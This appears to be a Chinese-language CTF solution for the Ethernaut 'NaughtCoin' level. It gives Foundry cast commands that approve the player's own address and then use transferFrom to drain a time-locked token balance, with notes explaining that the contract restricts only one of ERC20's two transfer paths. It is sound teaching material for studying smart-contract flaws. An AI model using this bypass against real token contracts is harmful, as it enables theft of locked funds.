# 16-NaughtCoin
```
# 1. 查看余额
cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc

# 2. 授权
cast send $NaughtCoin_ADDRESS "approve(address,uint256)" $YOUR_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY

# 3. 使用 transferFrom 转走
cast send $NaughtCoin_ADDRESS "transferFrom(address,address,uint256)" $YOUR_ADDRESS $ANOTHER_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY
```
### 考察点:
- 构造函数语法：ERC20("NaughtCoin", "0x0") 是调用父合约构造函数
- 漏洞根源：ERC20 有两个转账入口，只限制了一个
- 以太坊原因：继承机制导致未重写的函数使用父合约实现
- 教训：重写函数时要考虑所有入口点，或重写内部函数